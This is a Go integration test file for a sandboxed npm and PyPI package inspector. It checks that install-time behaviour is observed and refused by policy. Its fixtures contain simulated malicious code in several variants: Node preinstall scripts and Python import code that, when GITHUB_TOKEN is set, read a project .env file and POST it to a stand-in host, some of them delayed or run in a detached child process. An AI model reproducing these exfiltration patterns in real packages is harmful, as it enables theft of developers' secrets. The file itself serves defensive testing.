//go:build linux && realcorpus

package bootstrap

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rahoney/heliopause/internal/application"
	artifactpypi "github.com/rahoney/heliopause/internal/artifact/pypi"
	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/evidence/local"
	inspectionnpm "github.com/rahoney/heliopause/internal/inspection/npm"
	inspectionpypi "github.com/rahoney/heliopause/internal/inspection/pypi"
	"github.com/rahoney/heliopause/internal/policy"
	"github.com/rahoney/heliopause/internal/sandbox"
	verificationnpm "github.com/rahoney/heliopause/internal/verification/npm"
	verificationpypi "github.com/rahoney/heliopause/internal/verification/pypi"
)

// stimulusSandboxCause keeps the first sandbox error, which the dynamic
// inspector intentionally folds into an INCOMPLETE limitation code.
type stimulusSandboxCause struct {
	*sandbox.Backend
	err error
}

func (s *stimulusSandboxCause) Execute(ctx context.Context, request domain.SandboxRequest) (domain.SandboxResult, error) {
	result, err := s.Backend.Execute(ctx, request)
	if s.err == nil {
		s.err = err
	}
	return result, err
}

// Controlled source bytes use the existing explicit test transport. Inspection,
// stored Evidence and Policy are real; public authenticity/install are not claimed.
func TestLinuxStimulusNodePolicyCorpusIntegration(t *testing.T) {
	if os.Getenv("HELOX_STIMULUS_CORPUS_INTEGRATION") != "1" || os.Geteuid() == 0 {
		t.Skip("requires declared ordinary-user controlled stimulus corpus")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Minute)
	defer cancel()
	executor, supervisor, _ := npmProjectIntegrationRuntime(t, ctx)
	const chain = `const http=require("node:http");
const request=http.get("http://probe.helox.invalid/probe",response=>{response.resume();response.on("end",()=>{
if(response.statusCode!==200){process.exitCode=91;return;}
const body=require("node:fs").readFileSync("/tmp/project/.env");
const sink=http.request({hostname:"sink.helox.invalid",path:"/sink",method:"POST",headers:{"Content-Length":body.length}},reply=>{reply.resume();reply.on("end",()=>{if(reply.statusCode!==204)process.exitCode=92;});});
sink.on("error",()=>{process.exitCode=93;});sink.end(body);
});});request.on("error",()=>{process.exitCode=94;});`
	const gate = `if(process.env.GITHUB_TOKEN&&require("node:fs").existsSync("/tmp/project/.env"))`
	child, err := json.Marshal(`setTimeout(()=>{` + chain + `},50);`)
	if err != nil {
		t.Fatal(err)
	}
	for _, item := range []struct {
		name, program string
		network       bool
	}{
		{"normal", "", false},
		{"normal-config-read", gate + `{require("node:fs").readFileSync("/tmp/project/.env");}`, false},
		{"conditional-chain", gate + `{` + chain + `}`, true},
		{"delayed-chain", gate + `{setTimeout(()=>{` + chain + `},50);}`, true},
		{"detached-child", gate + `{const child=require("node:child_process").spawn(process.execPath,["-e",` + string(child) + `],{detached:true,stdio:"ignore"});child.unref();}`, true},
	} {
		if !t.Run(item.name, func(t *testing.T) {
			root, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			var scripts map[string]string
			if item.program != "" {
				if strings.Contains(item.program, "'") {
					t.Fatal("controlled shell fixture contains a quote")
				}
				scripts = map[string]string{"preinstall": "node -e '" + item.program + "'"}
			}
			source, resolution := nodeBoundaryFixtureSource(t, ctx, root+"/intake", scripts, "#!/usr/bin/env node\nprocess.stdout.write('benign fixture\\n');\n")
			backend, err := sandbox.NewLinuxBackendWithExecutor(root+"/intake", executor, supervisor.Observer(), newObservationResourceAdapter())
			if err != nil {
				t.Fatal(err)
			}
			static, err := inspectionnpm.NewInspector(root + "/intake")
			if err != nil {
				t.Fatal(err)
			}
			cause := &stimulusSandboxCause{Backend: backend}
			dynamic, err := inspectionnpm.NewDynamicInspector(cause)
			if err != nil {
				t.Fatal(err)
			}
			composite, err := inspectionnpm.NewCompositeInspector(static, dynamic)
			if err != nil {
				t.Fatal(err)
			}
			store, err := local.NewStore(root + "/evidence")
			if err != nil {
				t.Fatal(err)
			}
			service, err := application.NewExecutionInspectService(source, verificationnpm.IntegrityVerifier{}, composite, store, policy.M3{}, policy.M4{}, domain.NewOperationID, domain.NewRunID)
			if err != nil {
				t.Fatal(err)
			}
			approved, inspectErr := service.InspectResolved(ctx, resolution)
			var refused *application.ExecutionPolicyFailure
			var inspected domain.InspectedDependencySet
			if item.name == "normal" {
				if inspectErr != nil || !approved.Valid() {
					t.Fatal("normal control not approved", inspectErr)
				}
				inspected = approved.Set().Inspected()
			} else {
				if !errors.As(inspectErr, &refused) || approved.Valid() || refused.Decision().Decision() == domain.DecisionAllow {
					t.Fatal("conditional artifact gained approval or lost trusted refusal facts", inspectErr)
				}
				inspected = refused.Inspected()
				if item.name == "normal-config-read" && refused.Decision().Decision() != domain.DecisionManualReview {
					t.Fatal("normal configuration read became a malicious-file/canary BLOCK", refused.Decision().Reasons())
				}
			}
			entries := inspected.Inspections()
			if len(entries) != 1 {
				t.Fatal("whole current entry missing")
			}
			entry := entries[0]
			for _, check := range entry.Checks() {
				if check.Required() && (check.Capability() != domain.CapabilitySupported || check.Status() != domain.ExecutionCompleted) {
					code, _ := check.LimitationCode()
					t.Fatal("stimulus coverage incomplete", check.ID(), check.Status(), code, cause.err)
				}
			}
			states, network := 0, uint64(0)
			for _, reference := range entry.Evidence() {
				fact, _, err := store.ReadReference(ctx, entry.RunID(), reference, entry.Artifact().Identity(), entry.Artifact().Digest())
				if err != nil {
					t.Fatal("same-subject stored Evidence unavailable", err)
				}
				if fact.Kind() == "workspace-state" {
					states++
				}
				if fact.Kind() == "npm-dynamic-lifecycle" {
					var summary struct {
						Counts map[string]uint64 `json:"counts"`
					}
					if err := json.Unmarshal([]byte(fact.Summary()), &summary); err != nil {
						t.Fatal(err)
					}
					network += summary.Counts["NETWORK:network-attempt"]
				}
			}
			if states != 2 || item.network != (network > 0) {
				t.Fatal("required condition/late-child action not observed", states, network)
			}
			t.Logf("stimulus_node case=%s current_checks=%d stored_states=%d network=%d policy=%s approval=%t public_authenticity/install=NOT_CLAIMED", item.name, len(entry.Checks()), states, network, entry.PolicyDecision().Decision(), approved.Valid())
		}) {
			t.FailNow()
		}
	}
}

// The same artifact is dormant during lifecycle inspection and activates only
// through the controller-selected readonly entry. The runtime result is not an
// additional inspection approval or a malware detection-rate measurement.
func TestLinuxStimulusNodeEntryCorpusIntegration(t *testing.T) {
	if os.Getenv("HELOX_STIMULUS_CORPUS_INTEGRATION") != "1" || os.Geteuid() == 0 {
		t.Skip("requires declared ordinary-user controlled stimulus corpus")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	executor, supervisor, _ := npmProjectIntegrationRuntime(t, ctx)
	const program = `#!/usr/bin/env node
if(process.argv[2]==="activate") {
  process.stdout.write("entry-active\n");
  const socket=require("node:net").connect(9,"127.0.0.1");
  socket.on("error",()=>{});
} else { process.stdout.write("entry-normal\n"); }
`
	for _, mode := range []string{"normal", "activate"} {
		if !t.Run(mode, func(t *testing.T) {
			root, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			backend, err := sandbox.NewLinuxBackendWithExecutor(root+"/intake", executor, supervisor.Observer(), newObservationResourceAdapter())
			if err != nil {
				t.Fatal(err)
			}
			source, resolution := nodeBoundaryFixtureSource(t, ctx, root+"/intake", nil, program)
			execution, layout := nodeBoundaryExecution(t, ctx, root, backend, source, resolution, []string{mode})
			result, runErr := backend.ExecuteNodeExecution(ctx, execution, layout)
			if mode == "normal" {
				code, exited := result.ExitCode()
				if runErr != nil || !result.Complete() || !exited || code != 0 || string(result.Stdout()) != "entry-normal\n" {
					t.Fatal("normal selected entry failed", runErr)
				}
			} else {
				var programError *sandbox.NodeProgramError
				if runErr == nil || result.Complete() || errors.As(runErr, &programError) ||
					!strings.HasPrefix(string(result.Stdout()), "entry-active\n") || !strings.Contains(runErr.Error(), "network-attempt") {
					t.Fatal("execution-only behavior was not reached and refused from actual network facts", runErr)
				}
			}
			parts := strings.Split(execution.EntryArtifact().ContentHandle(), ":")
			if len(parts) != 3 {
				t.Fatal("controlled intake handle differs")
			}
			archive, err := os.ReadFile(filepath.Join(root, "intake", parts[1], "tarball.tgz"))
			if err != nil {
				t.Fatal(err)
			}
			digest := sha256.Sum256(archive)
			if hex.EncodeToString(digest[:]) != execution.EntryArtifact().Digest().String() {
				t.Fatal("selected entry mutated the original artifact")
			}
			t.Logf("stimulus_node_entry case=%s lifecycle_policy=ALLOW runtime_complete=%t source_unchanged=true host_install=NOT_PERFORMED", mode, result.Complete())
		}) {
			t.FailNow()
		}
	}
}

func TestLinuxStimulusPythonPolicyCorpusIntegration(t *testing.T) {
	if os.Getenv("HELOX_STIMULUS_CORPUS_INTEGRATION") != "1" || os.Geteuid() == 0 {
		t.Skip("requires declared ordinary-user controlled stimulus corpus")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	executor, supervisor, _ := npmProjectIntegrationRuntime(t, ctx)
	const chain = `import http.client
from pathlib import Path
probe=http.client.HTTPConnection('probe.helox.invalid', timeout=1)
probe.request('GET','/probe')
response=probe.getresponse()
assert response.status==200
response.read()
probe.close()
dummy=Path('/tmp/project/.env').read_bytes()
sink=http.client.HTTPConnection('sink.helox.invalid', timeout=1)
sink.request('POST','/sink',body=dummy)
response=sink.getresponse()
assert response.status==204
response.read()
sink.close()
`
	const normal = "def main():\n    return 0\n"
	for _, mode := range []string{"normal", "normal-config-read", "conditional-chain", "delayed-chain", "detached-child"} {
		if !t.Run(mode, func(t *testing.T) {
			root, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			program := normal
			if mode != "normal" {
				body := chain
				if mode == "normal-config-read" {
					body = "from pathlib import Path\nPath('/tmp/project/.env').read_bytes()\n"
				}
				if mode == "delayed-chain" {
					body = "import time\ntime.sleep(0.05)\n" + body
				}
				if mode == "detached-child" {
					body = "if os.fork()==0:\n" + "    " + strings.ReplaceAll("import time\ntime.sleep(0.05)\n"+body+"os._exit(0)\n", "\n", "\n    ") + "\n"
				}
				program += "import os\nif os.environ.get('GITHUB_TOKEN') and os.path.exists('/tmp/project/.env'):\n    " + strings.ReplaceAll(strings.TrimSpace(body), "\n", "\n    ") + "\n"
			}
			source, resolution := pythonBoundarySourceWithModule(t, root+"/intake", program)
			backend, err := sandbox.NewLinuxPyPIDynamicBackendWithExecutor(root+"/intake", executor, supervisor.Observer(), newObservationResourceAdapter())
			if err != nil {
				t.Fatal(err)
			}
			runtime := sandbox.PinnedPythonRuntime()
			static, err := inspectionpypi.NewStaticInspector(root+"/intake", artifactpypi.WheelTarget{Python: runtime.InterpreterTag, ABI: runtime.ABITag, Platform: runtime.PlatformTag})
			if err != nil {
				t.Fatal(err)
			}
			dynamic, err := inspectionpypi.NewDynamicInspector(backend)
			if err != nil {
				t.Fatal(err)
			}
			composite, err := inspectionpypi.NewCompositeInspector(static, dynamic)
			if err != nil {
				t.Fatal(err)
			}
			store, err := local.NewStore(root + "/evidence")
			if err != nil {
				t.Fatal(err)
			}
			service, err := application.NewExecutionInspectService(source, verificationpypi.IntegrityVerifier{}, composite, store, policy.M3{}, policy.M5{}, domain.NewOperationID, domain.NewRunID)
			if err != nil {
				t.Fatal(err)
			}
			approved, inspectErr := service.InspectResolved(ctx, resolution)
			var refused *application.ExecutionPolicyFailure
			var inspected domain.InspectedDependencySet
			normalControl := mode == "normal" || mode == "normal-config-read"
			if normalControl {
				if inspectErr != nil || !approved.Valid() {
					t.Fatal("normal Python control not approved", inspectErr)
				}
				inspected = approved.Set().Inspected()
			} else {
				if !errors.As(inspectErr, &refused) || approved.Valid() || refused.Decision().Decision() == domain.DecisionAllow {
					t.Fatal("Python conditional artifact gained approval or lost refusal", inspectErr)
				}
				inspected = refused.Inspected()
			}
			entries := inspected.Inspections()
			if len(entries) != 1 {
				t.Fatal("whole current Python entry missing")
			}
			entry := entries[0]
			for _, check := range entry.Checks() {
				if check.Required() && (check.Capability() != domain.CapabilitySupported || check.Status() != domain.ExecutionCompleted) {
					code, _ := check.LimitationCode()
					t.Fatal("Python stimulus incomplete", check.ID(), check.Status(), code)
				}
			}
			states, network := 0, uint64(0)
			for _, reference := range entry.Evidence() {
				fact, _, err := store.ReadReference(ctx, entry.RunID(), reference, entry.Artifact().Identity(), entry.Artifact().Digest())
				if err != nil {
					t.Fatal("same-subject Python Evidence unavailable", err)
				}
				if fact.Kind() == "workspace-state" {
					states++
				}
				if fact.Kind() == "pypi-dynamic-import" {
					var summary struct {
						Counts map[string]uint64 `json:"counts"`
					}
					if err := json.Unmarshal([]byte(fact.Summary()), &summary); err != nil {
						t.Fatal(err)
					}
					network += summary.Counts["NETWORK:network-attempt"]
				}
			}
			if states != 2 || normalControl && network != 0 || !normalControl && network == 0 {
				t.Fatal("Python conditional/late-child action missing", states, network)
			}
			t.Logf("stimulus_python case=%s current_checks=%d stored_states=%d network=%d policy=%s approval=%t public_authenticity/install=NOT_CLAIMED", mode, len(entry.Checks()), states, network, entry.PolicyDecision().Decision(), approved.Valid())
		}) {
			t.FailNow()
		}
	}
}

func TestLinuxStimulusPythonEntryCorpusIntegration(t *testing.T) {
	if os.Getenv("HELOX_STIMULUS_CORPUS_INTEGRATION") != "1" || os.Geteuid() == 0 {
		t.Skip("requires declared ordinary-user controlled stimulus corpus")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	executor, supervisor, _ := npmProjectIntegrationRuntime(t, ctx)
	const module = `def main():
    import sys
    if len(sys.argv)>1 and sys.argv[1]=='activate':
        import socket
        print('entry-active',flush=True)
        try:
            socket.create_connection(('127.0.0.1',9),timeout=1).close()
        except OSError:
            pass
    else:
        print('entry-normal',flush=True)
    return 0
`
	for _, mode := range []string{"normal", "activate"} {
		if !t.Run(mode, func(t *testing.T) {
			root, err := filepath.EvalSymlinks(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			backend, err := sandbox.NewLinuxPyPIDynamicBackendWithExecutor(root+"/intake", executor, supervisor.Observer(), newObservationResourceAdapter())
			if err != nil {
				t.Fatal(err)
			}
			source, resolution := pythonBoundarySourceWithModule(t, root+"/intake", module)
			execution, entry := pythonBoundaryExecution(t, ctx, root, backend, source, resolution, []string{mode})
			result, runErr := backend.ExecutePythonExecution(ctx, execution, entry)
			if mode == "normal" {
				code, exited := result.ExitCode()
				if runErr != nil || !result.Complete() || !exited || code != 0 || string(result.Stdout()) != "entry-normal\n" {
					t.Fatal("normal Python entry failed", runErr)
				}
			} else {
				var programError *sandbox.PythonProgramError
				if runErr == nil || result.Complete() || errors.As(runErr, &programError) || !strings.HasPrefix(string(result.Stdout()), "entry-active\n") || !strings.Contains(runErr.Error(), "network-attempt") {
					t.Fatal("Python execution-only behavior not reached and refused from actual network facts", runErr)
				}
			}
			parts := strings.Split(execution.EntryArtifact().ContentHandle(), ":")
			if len(parts) != 3 {
				t.Fatal("controlled Python intake handle differs")
			}
			wheel, err := os.ReadFile(filepath.Join(source.root, parts[1], "wheel.whl"))
			if err != nil {
				t.Fatal(err)
			}
			digest := sha256.Sum256(wheel)
			if hex.EncodeToString(digest[:]) != source.digest.String() {
				t.Fatal("Python entry mutated original wheel")
			}
			t.Logf("stimulus_python_entry case=%s lifecycle_policy=ALLOW runtime_complete=%t source_unchanged=true host_install=NOT_PERFORMED", mode, result.Complete())
		}) {
			t.FailNow()
		}
	}
}
